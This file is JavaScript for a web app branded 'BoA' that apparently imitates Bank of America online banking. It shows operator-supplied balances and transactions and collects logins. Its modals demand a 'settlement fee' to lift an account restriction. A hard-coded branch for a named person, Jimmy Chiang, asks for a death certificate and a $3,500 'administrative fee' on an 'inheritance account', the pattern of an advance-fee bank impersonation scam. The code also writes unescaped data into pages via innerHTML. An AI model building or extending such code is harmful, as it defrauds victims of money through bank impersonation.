(function () {
    let cachedConfig = null;
    let realtimeChannel = null;
    let supabaseClient = null;
    let eventSource = null;
    let fallbackTimer = null;
    let refreshTimer = null;

    function formatCurrency(amount) {
        return new Intl.NumberFormat('en-US', {
            style: 'currency',
            currency: 'USD'
        }).format(Number(amount) || 0);
    }

    function normalizeConfig(data) {
        return {
            fullName: data.fullName,
            accounts: data.accounts || [],
            transferError: data.transferError,
            restriction: data.restriction,
            invest: data.invest,
            transactions: data.transactions || []
        };
    }

    function loadScript(src) {
        return new Promise(function (resolve, reject) {
            if (document.querySelector('script[data-live-sync-src="' + src + '"]')) {
                resolve();
                return;
            }
            const script = document.createElement('script');
            script.src = src;
            script.async = true;
            script.setAttribute('data-live-sync-src', src);
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    }

    async function refreshFromServer(renderFn) {
        await window.BoAConfig.load();
        if (typeof renderFn === 'function') {
            renderFn();
        }
    }

    function scheduleRefresh(renderFn) {
        if (refreshTimer) {
            clearTimeout(refreshTimer);
        }
        refreshTimer = setTimeout(function () {
            refreshFromServer(renderFn).catch(function () {
                // Ignore background refresh errors
            });
        }, 250);
    }

    async function setupSupabaseRealtime(cfg, renderFn) {
        await loadScript('https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js');

        if (!window.supabase || typeof window.supabase.createClient !== 'function') {
            throw new Error('Supabase client unavailable.');
        }

        if (!supabaseClient) {
            supabaseClient = window.supabase.createClient(cfg.url, cfg.anonKey);
        }

        if (realtimeChannel) {
            await supabaseClient.removeChannel(realtimeChannel);
            realtimeChannel = null;
        }

        realtimeChannel = supabaseClient
            .channel('boa-config-sync')
            .on('postgres_changes', {
                event: '*',
                schema: 'public',
                table: 'config_sync'
            }, function () {
                scheduleRefresh(renderFn);
            })
            .subscribe();
    }

    function setupSseSync(renderFn) {
        const token = window.BoAAuth && typeof window.BoAAuth.getToken === 'function'
            ? window.BoAAuth.getToken()
            : sessionStorage.getItem('boaUserToken');

        if (!token || typeof EventSource === 'undefined') {
            return false;
        }

        if (eventSource) {
            eventSource.close();
        }

        eventSource = new EventSource('/api/updates?token=' + encodeURIComponent(token));
        eventSource.onmessage = function () {
            scheduleRefresh(renderFn);
        };
        eventSource.onerror = function () {
            if (eventSource) {
                eventSource.close();
                eventSource = null;
            }
        };
        return true;
    }

    async function setupLiveSync(renderFn) {
        let realtimeReady = false;

        // Same-origin SSE first — no CDN download on the critical path
        if (setupSseSync(renderFn)) {
            realtimeReady = true;
        }

        try {
            const response = await fetch('/api/public/realtime-config');
            const cfg = await response.json();
            if (cfg.enabled && cfg.url && cfg.anonKey) {
                await setupSupabaseRealtime(cfg, renderFn);
                realtimeReady = true;
            }
        } catch (error) {
            // Fall back to polling below if needed
        }

        if (!realtimeReady) {
            fallbackTimer = setInterval(function () {
                refreshFromServer(renderFn).catch(function () {
                    // Ignore background refresh errors
                });
            }, 15000);
        } else {
            // Light safety net when live sync is already running
            setInterval(function () {
                refreshFromServer(renderFn).catch(function () {
                    // Ignore background refresh errors
                });
            }, 120000);
        }
    }

    window.BoAConfig = {
        formatCurrency: formatCurrency,

        isJimmyChiang: function (name) {
            const fullName = name || (cachedConfig && cachedConfig.fullName) || '';
            return /^jimmy\s+chiang$/i.test(String(fullName).trim());
        },

        getJimmyUpgradeNotice: function () {
            return {
                title: 'ACCOUNT UPGRADE PENDING',
                bodyHtml:
                    'Your inheritance account is currently unavailable due to an account upgrade and missing documentation: the death certificate of the deceased account holder.<br><br>' +
                    'A <strong style="color: #E31837;">$3,500</strong> administrative fee is required for the account upgrade and activation.<br><br>' +
                    '<strong>Status: Pending Completion</strong>',
                button: 'I Understand',
                support: 'Contact Support'
            };
        },

        load: async function () {
            const token = window.BoAAuth && typeof window.BoAAuth.getToken === 'function'
                ? window.BoAAuth.getToken()
                : sessionStorage.getItem('boaUserToken');
            const headers = {};
            if (token) {
                headers.Authorization = 'Bearer ' + token;
            }

            const response = await fetch('/api/config', { headers: headers });
            if (!response.ok) {
                throw new Error('Unable to load app configuration.');
            }
            const data = await response.json();
            cachedConfig = normalizeConfig(data);
            return cachedConfig;
        },

        get: function () {
            if (!cachedConfig) {
                throw new Error('Configuration not loaded. Call BoAConfig.load() first.');
            }
            return cachedConfig;
        },

        login: async function (username, password) {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
            const data = await response.json();
            if (response.ok && data.success) {
                return { success: true, userId: data.userId, token: data.token };
            }
            return { success: false };
        },

        initPage: async function (renderFn) {
            await this.load();
            if (typeof renderFn === 'function') {
                renderFn();
            }

            // Live sync must not delay first paint / account UI
            function startLiveSync() {
                setupLiveSync(renderFn).catch(function () {
                    // Ignore live-sync setup errors
                });
            }

            if (typeof window.requestIdleCallback === 'function') {
                window.requestIdleCallback(startLiveSync, { timeout: 1500 });
            } else {
                setTimeout(startLiveSync, 0);
            }
        },

        renderDashboard: function () {
            const config = this.get();
            const greeting = document.getElementById('userGreeting');
            const accountList = document.getElementById('accountList');

            if (greeting) {
                greeting.textContent = 'Hello, ' + config.fullName;
            }

            if (accountList) {
                accountList.innerHTML = config.accounts.map(function (account, index) {
                    const divider = index < config.accounts.length - 1
                        ? '<div class="divider full-width"></div>'
                        : '';
                    return (
                        '<div class="account-item">' +
                            '<div class="account-details">' +
                                '<p class="account-name">' + account.name + '</p>' +
                                '<h1 class="account-balance">' + BoAConfig.formatCurrency(account.balance) + '</h1>' +
                            '</div>' +
                            '<button class="view-btn">VIEW</button>' +
                        '</div>' +
                        divider
                    );
                }).join('');
            }
        },

        renderDepositAccounts: function () {
            const config = this.get();
            const dropdown = document.getElementById('accountDropdown');
            const selectedName = document.getElementById('selectedAccountName');
            const selectedBalance = document.getElementById('selectedAccountBalance');

            if (!dropdown || !config.accounts.length) {
                return;
            }

            const currentName = selectedName ? selectedName.textContent : '';
            const matchedAccount = config.accounts.find(function (account) {
                return account.name === currentName;
            }) || config.accounts[0];

            dropdown.innerHTML = config.accounts.map(function (account) {
                const formatted = BoAConfig.formatCurrency(account.balance);
                const selectedClass = account.name === matchedAccount.name ? ' selected' : '';
                return (
                    '<div class="account-option' + selectedClass + '" data-name="' + account.name + '" data-balance="' + formatted + '">' +
                        '<span class="account-name">' + account.name + '</span>' +
                        '<span class="account-balance-small">Available: ' + formatted + '</span>' +
                    '</div>'
                );
            }).join('');

            if (selectedName && selectedBalance) {
                selectedName.textContent = matchedAccount.name;
                selectedBalance.textContent = 'Available: ' + this.formatCurrency(matchedAccount.balance);
            }

            if (typeof window.bindDepositAccountOptions === 'function') {
                window.bindDepositAccountOptions();
            }
        },

        renderTransferError: function () {
            const config = this.get();
            const title = document.getElementById('transferErrorTitle');
            const message = document.getElementById('transferErrorMessage');
            const button = document.getElementById('retryTransferBtn');

            if (title) title.textContent = config.transferError.title;
            if (message) message.textContent = config.transferError.message;
            if (button) button.textContent = config.transferError.button;
        },

        renderInvestRestriction: function () {
            const config = this.get();

            const title = document.getElementById('investRestrictionTitle') || document.querySelector('#restrictionModal .security-title');
            const greeting = document.getElementById('investRestrictionGreeting');
            const message = document.getElementById('investRestrictionMessage');
            const feeLine = document.getElementById('investRestrictionFeeText');
            const fee = document.getElementById('investSettlementFee');
            const button = document.getElementById('closeRestrictionBtn');
            const support = document.getElementById('contactSupportLink');

            if (this.isJimmyChiang(config.fullName)) {
                const notice = this.getJimmyUpgradeNotice();
                if (title) title.textContent = notice.title;
                if (greeting) greeting.innerHTML = '';
                if (message) message.innerHTML = notice.bodyHtml;
                if (feeLine) feeLine.innerHTML = '';
                if (button) button.textContent = notice.button;
                if (support) support.textContent = notice.support;
                return;
            }

            const restriction = config.restriction || {};
            const feeFormatted = this.formatCurrency(restriction.settlementFee);
            const name = config.fullName || 'Customer';

            function fill(template, fallback) {
                return String(template || fallback || '')
                    .replace(/\{name\}/gi, name)
                    .replace(/\{fee\}/gi, feeFormatted);
            }

            if (title) {
                title.textContent = restriction.title || 'Account Restricted';
            }
            if (greeting) {
                greeting.innerHTML = fill(restriction.greeting, 'Dear {name},') + '<br><br>';
            }
            if (message) {
                message.textContent = restriction.message || '';
            }
            if (feeLine) {
                feeLine.innerHTML = fill(restriction.feeText, 'A settlement fee of {fee} is required to restore full access and remove the restriction, so normal account operations will be restored.')
                    .split(feeFormatted)
                    .join('<strong style="color: #E31837;">' + feeFormatted + '</strong>');
            } else if (fee) {
                fee.textContent = feeFormatted;
            }
            if (button) {
                button.textContent = restriction.button || 'I Understand';
            }
            if (support) {
                support.textContent = restriction.support || 'Contact Support';
            }
        },

        renderInvestSummary: function () {
            const config = this.get();
            const total = document.getElementById('investTotalAmount');
            const change = document.getElementById('investChangeAmount');
            const holdingsList = document.getElementById('holdingsList');

            if (total) {
                total.textContent = this.formatCurrency(config.invest.totalValue);
            }
            if (change) {
                const sign = config.invest.changeAmount >= 0 ? '+' : '';
                const percentSign = config.invest.changePercent >= 0 ? '+' : '';
                change.textContent = sign + this.formatCurrency(config.invest.changeAmount) +
                    ' (' + percentSign + Number(config.invest.changePercent).toFixed(2) + '%)';
            }
            if (holdingsList) {
                holdingsList.innerHTML = config.invest.holdings.map(function (holding) {
                    const changeClass = holding.change < 0 ? ' negative' : '';
                    const changeSign = holding.change >= 0 ? '+' : '';
                    return (
                        '<div class="holding-item">' +
                            '<div>' +
                                '<div class="holding-name">' + holding.name + '</div>' +
                                '<div class="holding-symbol">' + holding.symbol + '</div>' +
                            '</div>' +
                            '<div>' +
                                '<div class="holding-value">' + BoAConfig.formatCurrency(holding.value) + '</div>' +
                                '<div class="holding-change' + changeClass + '">' + changeSign + BoAConfig.formatCurrency(Math.abs(holding.change)) + '</div>' +
                            '</div>' +
                        '</div>'
                    );
                }).join('');
            }
        },

        renderTransactions: function () {
            const config = this.get();
            const container = document.getElementById('transaction-list-container');
            if (!container) {
                return;
            }

            const fragment = document.createDocumentFragment();
            config.transactions.forEach(function (tx) {
                const item = document.createElement('div');
                item.className = 'transaction-item';
                const formattedAmount = BoAConfig.formatCurrency(Math.abs(tx.amount));
                const sign = tx.type === 'positive' ? '+' : '-';
                let detailsHtml = '<p class="transaction-desc">' + tx.desc + '</p>' +
                    '<p class="transaction-sub">' + tx.sub + '</p>';
                if (tx.detail) {
                    detailsHtml += '<p class="transaction-sub">' + tx.detail + '</p>';
                }
                if (tx.ref) {
                    detailsHtml += '<p class="transaction-sub">Ref: ' + tx.ref + '</p>';
                }
                item.innerHTML =
                    '<div class="transaction-date">' +
                        '<span class="month">' + tx.month + '</span>' +
                        '<span class="day">' + tx.day + '</span>' +
                        '<span class="year">' + tx.year + '</span>' +
                    '</div>' +
                    '<div class="transaction-details">' + detailsHtml + '</div>' +
                    '<div class="transaction-amount ' + tx.type + '">' + sign + formattedAmount + '</div>';
                fragment.appendChild(item);
            });
            container.innerHTML = '';
            container.appendChild(fragment);
        }
    };
})();
